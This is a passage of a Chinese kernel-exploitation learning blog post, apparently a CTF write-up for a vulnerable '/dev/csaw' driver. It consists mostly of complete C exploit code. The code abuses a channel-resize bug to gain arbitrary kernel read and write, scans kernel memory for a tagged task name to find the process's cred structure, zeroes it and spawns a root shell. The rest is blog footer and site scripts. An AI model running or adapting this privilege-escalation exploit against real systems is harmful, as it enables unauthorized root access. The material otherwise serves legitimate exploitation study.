class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span>  </span><br><span class="line">    <span class="type">int</span> id;  </span><br><span class="line">    <span class="type">char</span> *buf;  </span><br><span class="line">    <span class="type">size_t</span> count;  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span>  </span><br><span class="line">    <span class="type">int</span> id;  </span><br><span class="line">    <span class="type">loff_t</span> index;  </span><br><span class="line">    <span class="type">int</span> whence;  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span> &#123;  </span><br><span class="line">   <span class="built_in">puts</span>(msg);  </span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">-1</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//驱动的文件描述符  </span></span><br><span class="line"><span class="type">int</span> fd;  </span><br><span class="line"><span class="comment">//初始化驱动  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initFD</span><span class="params">()</span> &#123;  </span><br><span class="line">   fd = open(<span class="string">&quot;/dev/csaw&quot;</span>,O_RDWR);  </span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">      errExit(<span class="string">&quot;[-] open file error!!&quot;</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//申请一个channel,返回id  </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_channel</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;  </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">args</span>;</span>  </span><br><span class="line">   args.buf_size = size;  </span><br><span class="line">   args.id = <span class="number">-1</span>;  </span><br><span class="line">   ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;args);  </span><br><span class="line">   <span class="keyword">if</span> (args.id == <span class="number">-1</span>) &#123;  </span><br><span class="line">      errExit(<span class="string">&quot;[-]alloc_channel error!!&quot;</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">return</span> args.id;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//改变channel的大小  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shrink_channel</span><span class="params">(<span class="type">int</span> id,<span class="type">size_t</span> size)</span> &#123;  </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">args</span>;</span>  </span><br><span class="line">   args.id = id;  </span><br><span class="line">   args.size = size;  </span><br><span class="line">   ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;args);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//seek  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">seek_channel</span><span class="params">(<span class="type">int</span> id,<span class="type">loff_t</span> offset,<span class="type">int</span> whence)</span> &#123;  </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">args</span>;</span>  </span><br><span class="line">   args.id = id;  </span><br><span class="line">   args.index = offset;  </span><br><span class="line">   args.whence = whence;  </span><br><span class="line">   ioctl(fd,CSAW_SEEK_CHANNEL,&amp;args);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//读取数据  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_channel</span><span class="params">(<span class="type">int</span> id,<span class="type">char</span> *buf,<span class="type">size_t</span> count)</span> &#123;  </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">args</span>;</span>  </span><br><span class="line">   args.id = id;  </span><br><span class="line">   args.buf = buf;  </span><br><span class="line">   args.count = count;  </span><br><span class="line">   ioctl(fd,CSAW_READ_CHANNEL,&amp;args);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//写数据  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_channel</span><span class="params">(<span class="type">int</span> id,<span class="type">char</span> *buf,<span class="type">size_t</span> count)</span> &#123;  </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">args</span>;</span>  </span><br><span class="line">   args.id = id;  </span><br><span class="line">   args.buf = buf;  </span><br><span class="line">   args.count = count;  </span><br><span class="line">   ioctl(fd,CSAW_WRITE_CHANNEL,&amp;args);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//任意地址读  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_read</span><span class="params">(<span class="type">int</span> id,<span class="type">char</span> *buf,<span class="type">size_t</span> addr,<span class="type">size_t</span> count)</span> &#123;  </span><br><span class="line">   seek_channel(id,addr<span class="number">-0x10</span>,SEEK_SET);  </span><br><span class="line">   read_channel(id,buf,count);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//任意地址写  </span></span><br><span class="line"><span class="comment">//由于题目中使用了strncpy_from_user,遇到0就会截断，因此，我们逐字节写入  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_write</span><span class="params">(<span class="type">int</span> id,<span class="type">char</span> *buf,<span class="type">size_t</span> addr,<span class="type">size_t</span> count)</span> &#123;  </span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;count;i++) &#123;  </span><br><span class="line">      seek_channel(id,addr+i<span class="number">-0x10</span>,SEEK_SET);  </span><br><span class="line">      write_channel(id,buf+i,<span class="number">1</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="type">char</span> root_cred[<span class="number">28</span>] = &#123;<span class="number">0</span>&#125;;  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">   <span class="comment">//通过prctl给当前进程的task结构设置一个标记，方便我们在内存中搜索时可以作为依据  </span></span><br><span class="line">   <span class="comment">//char tag[16] = &quot;thisisatag&quot;;  </span></span><br><span class="line">   <span class="type">char</span> *buf = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x1000</span>);  </span><br><span class="line">   <span class="comment">//prctl(PR_SET_NAME,tag);  </span></span><br><span class="line">    <span class="type">char</span> target[<span class="number">16</span>];  </span><br><span class="line">    <span class="built_in">strcpy</span>(target,<span class="string">&quot;try2findmesauce&quot;</span>);  </span><br><span class="line">    prctl(PR_SET_NAME,target);  </span><br><span class="line">   initFD();  </span><br><span class="line">   <span class="comment">//申请一个channel，大小0x100  </span></span><br><span class="line">   <span class="type">int</span> id = alloc_channel(<span class="number">0x100</span>);  </span><br><span class="line">   <span class="comment">//改变channel大小，形成漏洞,实现任意地址读写  </span></span><br><span class="line">   shrink_channel(id,<span class="number">0x101</span>);  </span><br><span class="line">   <span class="type">size_t</span> cred_addr = <span class="number">-1</span>;  </span><br><span class="line">   <span class="comment">//task和cred结构的范围在0xffff880000000000~0xffffc80000000000  </span></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">size_t</span> addr=<span class="number">0xffff880000000000</span>;addr &lt; <span class="number">0xffffc80000000000</span>;addr += <span class="number">0x1000</span>) &#123;  </span><br><span class="line">      <span class="comment">//每次读取0x1000的字节  </span></span><br><span class="line">      arbitrary_read(id,buf,addr,<span class="number">0x1000</span>);  </span><br><span class="line">  </span><br><span class="line">      <span class="comment">//搜索当前读出的数据里是否有我们的标记  </span></span><br><span class="line">      <span class="type">size_t</span> tag_ptr = memmem(buf, <span class="number">0x1000</span>,target,<span class="number">16</span>);  </span><br><span class="line">      <span class="keyword">if</span> (tag_ptr) &#123;  </span><br><span class="line">         cred_addr = *(<span class="type">size_t</span> *)(tag_ptr - <span class="number">0x8</span>);  </span><br><span class="line">         <span class="type">size_t</span> real_cred_addr = *(<span class="type">size_t</span> *)(tag_ptr - <span class="number">0x10</span>);  </span><br><span class="line">         <span class="keyword">if</span> ((cred_addr &amp; <span class="number">0xff00000000000000</span>) &amp;&amp; cred_addr == real_cred_addr) &#123;  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found cred_ptr at 0x%lx\n&quot;</span>,addr + tag_ptr - (<span class="type">size_t</span>)buf);  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] cred_addr at 0x%lx\n&quot;</span>,cred_addr);  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">         &#125;  </span><br><span class="line">      &#125;  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">if</span> (cred_addr == <span class="number">-1</span>) &#123;  </span><br><span class="line">      errExit(<span class="string">&quot;[-]can&#x27;t find cred!!&quot;</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">   arbitrary_write(id,root_cred,cred_addr,<span class="number">28</span>);  </span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;  </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]rooted!!\n&quot;</span>);  </span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);  </span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">      errExit(<span class="string">&quot;[-]root fail!!\n&quot;</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag"># 堆溢出</a>
+              <a href="/ha1vk/tags/Linux-Kernel/" rel="tag"># Linux Kernel</a>
+              <a href="/ha1vk/tags/Linux%E5%86%85%E6%A0%B8%E5%A0%86/" rel="tag"># Linux内核堆</a>
+              <a href="/ha1vk/tags/task-struct/" rel="tag"># task_struct</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/03/04/linux_kernel_pwn_%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E4%BA%8C/" rel="prev" title="linux kernel pwn学习之条件竞争(二)userfaultfd">
+      <i class="fa fa-chevron-left"></i> linux kernel pwn学习之条件竞争(二)userfaultfd
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/03/06/linux_kernel_pwn_vdso/" rel="next" title="linux kernel pwn学习之劫持vdso">
+      linux kernel pwn学习之劫持vdso <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
